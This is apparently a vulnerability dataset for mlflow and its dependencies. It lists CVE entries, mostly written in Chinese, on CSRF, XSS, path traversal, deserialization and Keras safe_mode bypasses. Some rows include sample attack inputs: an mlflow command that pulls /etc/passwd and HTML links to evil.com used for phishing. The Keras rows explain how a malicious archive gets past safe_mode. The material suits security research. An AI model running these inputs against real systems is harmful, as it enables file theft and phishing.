mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发人员管理机器学习生命周期。该漏洞存在于创建实验与模型的功能中，攻击者可以利用跨站请求伪造（CSRF）攻击来在未授权用户的情况下创建实验和模型。具体来说，当用户访问精心构造的网页时，该攻击可以自动提交请求以创建新的模型，如“test”。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLFlow 是一个用于机器学习操作的程序，允许工程师运行、记录和重现他们的实验与模型。当攻击者利用符号链接和日志记录功能时，可能导致内部机密文件的曝光。漏洞的根本原因在于使用 Python 的 `with open` 函数，在处理符号链接的过程中不当处理导致泄露。如果攻击者成功提取了符号链接的归档文件并存储在跟踪服务器上，就能够利用 MLFlow API 获取相关文件。一旦攻击者获得 SSH 密钥，则可能导致对其他模型及其相关数据的访问。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习平台，用于管理机器学习项目的开发、实验和部署。当一个页面未能设置适当的 X-Frame-Options 或 Content-Security-Policy HTTP 头时，攻击者可以在其控制的页面中通过 iframe 加载受影响的页面。这种漏洞的根本原因在于缺乏必要的防护措施。攻击者可通过在用户的浏览器中叠加一个虚假的用户界面，诱使受害者进行诸如鼠标点击和键盘输入等操作，进而在被攻击的应用中无意执行指令。</p>,4,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理工具，允许用户追踪实验、项目和最终模型。在使用 mlflow cli 命令下载工件时，存在本地文件包含漏洞，攻击者可以通过提供不安全的 URI 来下载服务器上任何位置的文件。攻击者可以利用这一漏洞，执行类似 'mlflow artifacts download -u /etc/passwd -d /home/ubuntu/test/' 的命令，将 /etc/passwd 的内容下载到本地目录，从而暴露敏感信息。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,"<p>mlflow是一个开源的机器学习平台，旨在简化并优化机器学习模型的管理和部署。当使用`dangerouslySetInnerHTML`方法渲染用户输入的内容时，如果未采取适当的输入验证，就会导致HTML注入漏洞。攻击者可以通过存储恶意HTML代码创建假网页，例如使用标记<a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">click here to get gift</a>来实施钓鱼攻击，将受害者重定向到另一个网站。</p>",3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow是一个用于机器学习生命周期管理的开源平台，支持多种机器学习模型的实验跟踪、项目管理和模型部署。该漏洞源于使用pickle.load函数不当，攻击者可以借此加载恶意构造的pickle文件。当用户从互联网下载一个模型并使用该框架检查模型训练结果时，可能会触发代码执行。具体的执行流程是，当检查'train'步骤时，会调用inspect函数，继而调用BaseCard.load方法加载卡片模型，这一过程可能导致任意代码执行。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个开源的机器学习生命周期管理平台，允许用户轻松地构建和管理机器学习模型。该漏洞的根本原因在于 mlflow 在加载模型时使用了 Python 的原生 Unpickler，该组件对反序列化攻击存在脆弱性，允许恶意模型通过隐藏有效载荷来执行任意代码，包括操作系统命令。由于这一脆弱性，不仅在 mlflow.pyfunc.load_model 中存在，在 mlflow 的多个其他位置，如 mlflow.sklearn.load_model 和 mlflow.pytorch.pickle_module.py 中也有类似问题。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的机器学习平台，旨在帮助数据科学家和开发者管理整个机器学习生命周期。该漏洞存在于用户输入未被恰当验证和清理的情况下，导致攻击者能够通过 XSS 注入虚假的登录表单或欺骗性用户界面到合法网页中。攻击者可以在这些虚假表单中窃取敏感信息，例如用户名、密码或信用卡详细信息。具体地，在使用 `render_template_string` 函数时，如不对用户输入进行适当转义，用户控制的值即可能成为 JavaScript 代码的来源，最终导致跨站脚本攻击的发生。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源平台，用于管理机器学习生命周期，包括实验跟踪、项目打包和模型管理。在创建实验时，当使用 POST 请求向 /ajax-api/2.0/mlflow/experiments/create 发送包含相同名称的实验的请求时，系统原本应该检查该实验名称是否已经存在，并返回错误信息。然而，由于存在竞争条件，多个同时请求可以成功创建相同名称的实验。这种漏洞的根源在于对并发请求的处理不当，导致了一致性问题和安全隐患。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于管理机器学习生命周期的开源平台，它提供模型训练、记录和模型部署的功能。当用户上传数据集时，由于使用 MD5 哈希值作为数据集标识符，可能导致哈希冲突，从而阻止新的数据集上传。攻击者可以利用此漏洞，通过提前创建具有相同名称和内容的已知数据集，从而占用相应的MD5哈希值，导致其他用户无法上传同名数据集。</p>,3,1
mlflow_mlflow,mlflow,,True,,,,"<p>MLflow 是一个用于管理机器学习生命周期的开源平台，支持实验记录、模型部署和系列管理。该平台存在HTML/XSS注入漏洞，攻击者可以通过在网页表单或输入字段中注入恶意代码，从而使用户在浏览网页时被重定向到恶意网站。攻击者可以利用该漏洞通过修改描述字段来注入HTML代码，例如用 <a href=""http://evil.com"" rel=""noopener noreferrer"" target=""_blank"">submit your report here </a>，从而实现用户重定向。在用户保存后，该链接将出现在用户界面上，点击后会将用户重定向到恶意网站。</p>",2,1
mlflow_mlflow,mlflow,,True,,,,<p>MLflow 是一个开源的平台，旨在为机器学习项目提供管理和部署服务。该漏洞影响版本 2.5.0。由于在模型版本创建过程中未能正确处理输入参数，攻击者可以利用该漏洞向其他用户的账户注入恶意脚本。具体来说，攻击者在创建模型版本时，设置的运行链接（run_link）参数可以包含 JavaScript 代码。当受害者用户访问该链接时，恶意脚本将在其浏览器中执行，从而导致信息泄露或账户控制。</p>,2,1
mlflow_mlflow,mlflow,,True,,,,<p>mlflow 是一个用于机器学习项目的开源平台，提供了模型登记、追踪实验和模型部署等功能。该漏洞存在于 mlflow 的文件操作中，攻击者可以通过重写 YAML 文件中的敏感字段，导致远程代码执行或本地文件读取。具体来说，当调用 `write_yaml()` 函数并设置 `overwrite=True` 时，系统未能正确验证文件内容的有效性，攻击者能够覆盖关键属性如 `source` 和 `storage_location`，并在多种情况下利用此漏洞。</p>,1,1
mlflow_mlflow,mlflow,,True,CVE-2025-11201,CWE-22,2025-10-29,MLflow Tracking Server 是一个用于管理机器学习模型生命周期的开源平台，包括实验记录、模型注册和模型部署等功能。在该漏洞中，受影响组件在处理模型文件路径时，缺乏对用户输入路径的正确验证，导致攻击者能够构造恶意路径并触发文件操作。这种漏洞通常是由于未正确验证输入数据或未限制目录访问范围所引起的。攻击者可以利用构造的路径执行任意代码，具体地是在服务账户的权限上下文中执行代码。,1,2
mlflow_mlflow,scikit-learn,1.0.2,True,CVE-2024-5206,CWE-921 CWE-922,,scikit-learn 是一个基于 Python 的开源机器学习模块，支持数据挖掘和数据分析等功能。该漏洞源于 TfidfVectorizer 类在处理训练数据时，意外地将所有标记存储在 stop_words_ 属性中，而非仅存储进行 TF-IDF 计算所需的令牌子集。这种行为可能导致敏感信息泄露，例如密码或密钥，因为 stop_words_ 属性中可能包含本应被丢弃的标记。,3,1
mlflow_mlflow,jinja2,3.0.3,True,CVE-2024-22195,CWE-79,2024-01-11,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Jinja 3.1.3之前版本存在安全漏洞，该漏洞源于存在跨站脚本（XSS）漏洞。",3,0
mlflow_mlflow,jinja2,3.0.3,True,CVE-2024-34064,CWE-79,2024-05-06,"Pallets Jinja是一款使用Python语言编写的模板引擎。
Pallets Jinja 3.1.4之前版本存在安全漏洞，该漏洞源于将用户输入作为键传递给 xmlattr 过滤器时，Jinja 容易受到 HTML 属性注入。",3,0
mlflow_mlflow,jinja2,3.0.3,True,CVE-2024-56326,CWE-693 CWE-1336,2024-12-23,Jinja 是由 Pallets 开源的一个快速、富有表现力并可扩展的模板引擎。该漏洞存在于 Jinja 版本 3.1.5 之前，由于在沙箱环境中对 str.format 调用的检测存在不当，攻击者可以控制模板的内容并执行任意 Python 代码。攻击者可以通过创建包含恶意字符串的模板并利用自定义过滤器实现攻击，这可能导致系统安全性严重受损。,3,0
mlflow_mlflow,jinja2,3.0.3,True,CVE-2024-56201,CWE-150,2024-12-23,Jinja是Pallets开源的一个快速、富有表现力且可扩展的模板引擎。版本3.1.5之前的Jinja存在安全漏洞，该漏洞源于编译器的一个错误，允许同时控制模板内容和文件名的攻击者执行任意Python代码，无论Jinja的沙箱是否被使用。当应用程序执行不可信的模板时，攻击者需要能够控制模板的文件名和内容，才能有效利用此漏洞。,3,0
mlflow_mlflow,jinja2,3.0.3,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
mlflow_mlflow,tensorflow-cpu,<=2.12.0,True,CVE-2023-33976,CWE-190,2024-07-30,TensorFlow是用于机器学习的端到端开源平台。该组件在2.13.0之前版本存在输入验证错误漏洞，源于未指定2阶张量时，array_ops.upper_bound会导致程序崩溃。,2,2
mlflow_mlflow,pyspark,,True,CVE-2019-10099,CWE-312,2019-08-07,"Apache Spark是美国阿帕奇（Apache）软件基金会的一款支持非循环数据流和内存计算的大规模数据处理引擎。
Apache Spark 2.3.3之前版本中存在加密问题漏洞。该漏洞源于网络系统或产品未正确使用相关密码算法，导致内容未正确加密、弱加密、明文存储敏感信息等。",2,2
mlflow_mlflow,pyspark,,True,,CWE-77,2022-03-25,"## Overview
[pyspark](https://pypi.org/project/pyspark/) is a fast and general cluster computing system for Big Data.

Affected versions of this package are vulnerable to Arbitrary Command Execution via the `Utils.unpack` method when the filename is controlled by a malicious user. This vulnerability exists due to Hadoop's `unTar` function, that doesn't properly escape the filename before passing it to a shell command.
## Remediation
Upgrade `pyspark` to version 3.1.3, 3.3.0 or higher.
## References
- [Apache Jira Issues](https://issues.apache.org/jira/browse/SPARK-38631)
- [GitHub Commit](https://github.com/apache/spark/commit/057c051285ec32c665fb458d0670c1c16ba536b2)
- [GitHub Commit](https://github.com/apache/spark/commit/271b338324e88b0bfc63364937a56305f7b350fc)
- [GitHub Commit](https://github.com/apache/spark/commit/b0b226e79c00d8dc1bee2c9b6818000ab8806f80)
- [GitHub Commit](https://github.com/apache/spark/commit/fb9c633db950d7af70376ff1d076d36297e21c36)
- [GitHub PR](https://github.com/apache/spark/pull/35946)
",2,0
mlflow_mlflow,pyspark,,True,CVE-2018-8024,CWE-200,2018-07-12,在Apache Spark 2.1.0到2.1.2、2.2.0到2.2.1以及2.3.0版本中，恶意用户可以构造一个指向Spark集群UI的作业和阶段信息页面的URL。如果用户被诱导访问该URL，则可以导致脚本执行并暴露用户视图中的信息。一些浏览器（如最近版本的Chrome和Safari）能够阻止此类攻击，但当前版本的Firefox（及可能的其他浏览器）无法阻止。,3,0
mlflow_mlflow,pyspark,,True,CVE-2018-1334,CWE-200,2018-07-12,在Apache Spark 1.0.0 到 2.1.2，2.2.0 到 2.2.1，以及 2.3.0 版本中，当使用PySpark或SparkR时，不同的本地用户可以连接到Spark应用程序并冒充正在运行该应用程序的用户。,3,0
mlflow_mlflow,pyspark,,True,CVE-2018-11760,CWE-520,2019-01-28,"Apache Spark是一款支持非循环数据流和内存计算的大规模数据处理引擎。
Apache Spark中存在本地提权漏洞。攻击者可利用该漏洞获取提升的权限。以下版本受到影响：Apache Spark 1.x版本，2.0.x版本，2.1.x版本，2.2.0版本至2.2.2版本，2.3.0版本至3.1版本。",3,0
mlflow_mlflow,ipython,!=8.7.0,True,CVE-2023-24816,CWE-20 CWE-78,2023-02-10,"Interactive Python（IPython）是一个用于使用多种编程语言进行交互式计算的命令shell，最初是为Python编程语言开发的。
IPython(Interactive Python) 8.1.0之前版本存在操作系统命令注入漏洞。攻击者利用该漏洞执行命令注入攻击。",4,0
mlflow_mlflow,keras,,True,,CWE-502,2021-08-05,"## Overview
[keras](https://github.com/keras-team/keras) is a Keras is a high-level neural networks API for Python..

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. Loading keras models via yaml could allow arbitrary code execution via unsafe deserialization.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, thus allowing the attacker to control the state or the flow of the execution.
  
## Remediation
Upgrade `keras` to version 2.6.0rc3 or higher.
## References
- [GitHub Release](https://github.com/keras-team/keras/releases/tag/v2.6.0-rc3)
",2,2
mlflow_mlflow,keras,,True,CVE-2024-3660,CWE-94,2024-04-16,<p>TensorFlow Keras是TensorFlow开源的一个框架。为解决机器学习问题提供了一个可接近、高效的界面。 TensorFlow Keras 2.13之前版本存在安全漏洞，该漏洞源于存在任意代码注入漏洞，允许攻击者执行任意代码。</p>,1,1
mlflow_mlflow,keras,,True,CVE-2025-8747,CWE-502,2025-08-11,Keras 是一个用于深度学习的高层神经网络 API，广泛应用于机器学习模型的构建和训练。其 `Model.load_model` 方法用于加载模型文件，支持从磁盘或其他存储位置导入预训练模型。漏洞存在于 Keras 版本 3.0.0 至 3.10.0 中的 `Model.load_model` 方法，该方法的安全模式存在绕过问题。攻击者可通过诱导用户加载特制的 `.keras` 模型文件，触发反序列化问题（CWE-502），从而执行任意代码。漏洞的成因在于组件未正确校验输入数据的可信性，导致恶意模型文件中的代码能够在加载过程中被执行。,2,0
mlflow_mlflow,keras,,True,CVE-2025-9906,CWE-502,2025-09-19,Keras 是一个高层神经网络 API，用于搭建深度学习模型。其 Model.load_model 方法允许从存储的 .keras 模型文件中加载模型。该方法中存在一个漏洞，即使在 safe_mode=True 的情况下，攻击者也可通过特制的 .keras 模型文件实现任意代码执行。此漏洞的核心成因是 .keras 文件中的 config.json 文件可以调用 keras.config.enable_unsafe_deserialization() 方法来禁用安全模式。一旦禁用，攻击者即可利用 Keras 的 Lambda 层功能插入任意 Python 代码（以序列化形式存在）。触发条件是攻击者需要将 config.json 文件放在归档文件的第一位置，Lambda 层的恶意代码放在第二位置。,2,0
mlflow_mlflow,keras,,True,CVE-2025-9905,CWE-913,2025-09-19,"Keras 是一个高层神经网络 API，通常用于构建深度学习模型。其 `Model.load_model` 方法支持加载 .h5/.hdf5 文件格式的模型，这是 Keras 3 提供的向后兼容的遗留功能。漏洞的根源在于，当使用 `safe_mode=True` 选项加载 .h5/.hdf5 文件时，Keras 未正确验证文件的安全性，从而允许攻击者通过构造特制的恶意 .h5/.hdf5 模型文件，实现任意代码执行。

此漏洞利用了 Keras 中的 Lambda 层特性，该特性支持任意 Python 代码的序列化（pickle）。攻击者可以在恶意文件中嵌入恶意的 Python 代码片段，该代码将在加载模型文件时被执行。尽管 `safe_mode=True` 的目的是防止不安全的 Lambda 反序列化，但该选项在处理 .h5/.hdf5 文件时被忽略，导致用户误认为加载是安全的。

从技术上来看，问题出在 Keras 的 `legacy_h5_format.load_model_from_hdf5` 实现中，该方法完全忽略了 `safe_mode` 参数的存在，并直接加载文件中的内容。此行为为攻击者提供了代码执行的入口。",2,-2
mlflow_mlflow,keras,,True,CVE-2024-55459,CWE-494,2025-01-08,"Keras是Keras开源的一个多后端深度学习框架。
Keras 3.7.0版本存在安全漏洞，该漏洞源于允许攻击者通过get_file函数下载精心设计的tar文件，从而将任意文件写入用户的计算机。",3,0
mlflow_mlflow,keras,,True,CVE-2025-1550,CWE-94,2025-03-11,"Keras 是一个用于构建和训练深度学习模型的高层神经网络 API。其 Model.load_model 函数的 safe_mode 功能原本设计为防止不安全的 lambda 反序列化，但存在漏洞。攻击者可以通过手动构造的恶意 .keras 存档，修改其中的 config.json 文件，在模型加载过程中指定任意 Python 模块及其函数和参数，从而实现任意代码执行。

漏洞的成因是 Keras 在加载模型时未对内部模块函数的调用进行充分验证，允许攻击者利用 Keras 内置函数（如 keras.utils.get_file）来执行恶意操作，例如下载远程文件并覆盖本地文件。即使 safe_mode 启用，该漏洞仍然可被利用，因为它依赖于对批准模块的滥用。

影响范围包括默认配置的 Keras 环境，且不需要用户输入，攻击者只需提供恶意模型文件即可触发漏洞。",2,1
mlflow_mlflow,keras,,True,CVE-2025-12058,CWE-502,2025-10-29,Keras 是一个广泛使用的深度学习框架，主要用于构建和训练神经网络模型。Keras.Model.load_model 方法用于加载已保存的模型，包括特定格式的 .keras 存档文件。在深度学习开发中，该方法通常用于快速恢复训练模型或部署预训练模型。漏洞源于 StringLookup 层在模型加载过程中的处理方式。StringLookup 层的构造函数接受一个 vocabulary 参数，可以指定本地文件路径或远程文件路径。攻击者可以创建一个恶意的 .keras 文件，在其配置中嵌入本地文件路径，从而导致 Keras 在加载模型时尝试读取指定的本地文件内容并将其融入模型状态（例如通过 get_vocabulary() 方法检索）。此外，由于 Keras 使用 TensorFlow 的 tf.io.gfile 进行文件操作，该模块支持远程文件系统（如 GCS 和 HDFS）以及 HTTP/HTTPS 协议，这允许攻击者通过同样的机制从任意网络端点获取内容，从而实施 SSRF 攻击。漏洞的根本原因是 safe_mode=True 标志未能有效限制外部路径加载功能，导致意外的数据访问风险。,3,0
mlflow_mlflow,keras,,True,CVE-2025-12060,CWE-22,2025-10-30,"Keras 是一个广泛使用的高级框架，用于构建和训练深度学习模型。其 utils.get_file API 提供了从 URL 下载文件的功能，并支持自动解压文件。当使用 extract=True 参数解压 tar 格式文件时，该功能存在路径遍历漏洞。具体来说，工具函数调用了 Python 的 tarfile.extractall 方法，但没有启用关键的过滤功能（filter=""data""）。这使攻击者可以通过构造恶意的 tar 存档（包含特殊符号链接），实现任意文件写入到文件系统中的任意路径。该漏洞的根本原因是缺乏对解压文件路径的校验，结合 Python tarfile 模块中的已知缺陷（CVE-2025-4517），攻击者能够利用这一漏洞。即便升级 Python 到修复版本（例如 Python 3.13.4），仍需升级 Keras 到安全版本（Keras 3.12）才能彻底解决问题。",2,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-5480,CWE-77,2024-06-06,PyTorch 是一个流行的开源深度学习框架，广泛用于研究和生产环境。torch.distributed.rpc框架用于在分布式训练场景中支持RPC操作。在2.2.2版本之前，该框架在RPC操作期间没有正确验证被调用的函数，这导致攻击者可以在多CPU RPC通信过程中，通过内置的Python函数（如eval）执行任意命令。,2,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
mlflow_mlflow,torch,>=1.11.0,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
mlflow_mlflow,lightning,>=1.8.1,True,CVE-2024-5980,CWE-22,,Pytorch-Lightning 是美国 Lightning AI 开源的一个轻量级 PyTorch 包装器，专为高性能 AI 研究而设计。该组件的 v2.2.4 版本存在任意文件写入漏洞，漏洞源于 /v1/runs API 端点的路径遍历问题。当提取 tar.gz 文件时，攻击者可以利用此漏洞，部署恶意的 tar.gz 插件，从而将文件写入受害者文件系统的任意位置。,2,1
mlflow_mlflow,scrapy,,True,,,2022-07-30,"### Impact

When the [built-in HTTP proxy downloader middleware](https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy) processes a request with `proxy` metadata, and that `proxy` metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the `Proxy-Authentication` header, but only if that header is not already set.

There are third-party proxy-rotation downloader middlewares that set different `proxy` metadata every time they process a request.

Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.

These third-party proxy-rotation downloader middlewares could change the `proxy` metadata of a request to a new value, but fail to remove the `Proxy-Authentication` header from the previous value of the `proxy` metadata, causing the credentials of one proxy to be leaked to a different proxy.

If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under **Workarounds** below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.

### Patches

